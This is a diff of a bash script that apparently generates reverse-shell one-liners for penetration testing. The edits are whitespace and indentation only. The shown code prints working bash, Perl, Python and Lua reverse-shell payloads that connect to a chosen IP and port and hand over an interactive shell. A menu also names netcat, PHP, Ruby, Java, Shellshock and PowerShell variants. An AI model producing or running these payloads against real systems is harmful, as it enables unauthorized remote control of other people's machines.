@@ -59,18 +59,18 @@ function reverse_shell_list(){
 	    read shell_type
 
 	    case $shell_type in
-		    	1) bash_shell;;
-		    	2) perl_shell;;
-			    3) python_shell;;
-		    	4) php_shell;;
-			    5) ruby_shell;;
-			    6) netcat_shell;;
-		    	7) java_shell;;
-		    	8) shellshock;;
-		    	9) lua_shell;;
-                10) powershell;;
+		1) bash_shell;;
+		2) perl_shell;;
+		3) python_shell;;
+	  	4) php_shell;;
+		5) ruby_shell;;
+		6) netcat_shell;;
+		7) java_shell;;
+	    	8) shellshock;;
+	    	9) lua_shell;;
+		10) powershell;;
                 "exit"|"q"|"quit") exit 0;;
-			    *)echo -e "[-]Enter the shell number";reverse_shell_list;;
+		*)echo -e "[-]Enter the shell number";reverse_shell_list;;
 	    esac
     done
 }
@@ -80,18 +80,17 @@ function reverse_shell_list(){
 function bash_shell(){
 
 	echo -e "${pos}${Yellow}Bash shell:${Color_Off} bash -i >& /dev/tcp/${Red}$ipaddr/8080${Color_Off} 0>&1"
-
 }
 
 function perl_shell(){
 	
-		echo -e "${pos}${Yellow}Perl shell:${Color_Off} perl -e 'use Socket;${Red}\$i=\"$ipaddr\"${Color_Off};${Red}\$p=$port${Color_Off};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+	echo -e "${pos}${Yellow}Perl shell:${Color_Off} perl -e 'use Socket;${Red}\$i=\"$ipaddr\"${Color_Off};${Red}\$p=$port${Color_Off};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 
 }
 
 function python_shell(){
 	
-		echo -e "${pos}${Yellow}Python shell:${Color_Off} python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((${Red}\"$ipaddr\",$port${Color_Off}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+	echo -e "${pos}${Yellow}Python shell:${Color_Off} python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((${Red}\"$ipaddr\",$port${Color_Off}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 
 }
 
@@ -135,7 +134,7 @@ function shellshock(){
 
 function lua_shell(){
 
-		echo -e "${pos}${Yellow}Lua shell:${Color_Off} lua5.1 -e 'local host,port = \"${Red}$ipaddr${Color_Off}\",${Red}$port${Color_Off} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
+	echo -e "${pos}${Yellow}Lua shell:${Color_Off} lua5.1 -e 'local host,port = \"${Red}$ipaddr${Color_Off}\",${Red}$port${Color_Off} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
 
 }
 function powershell(){
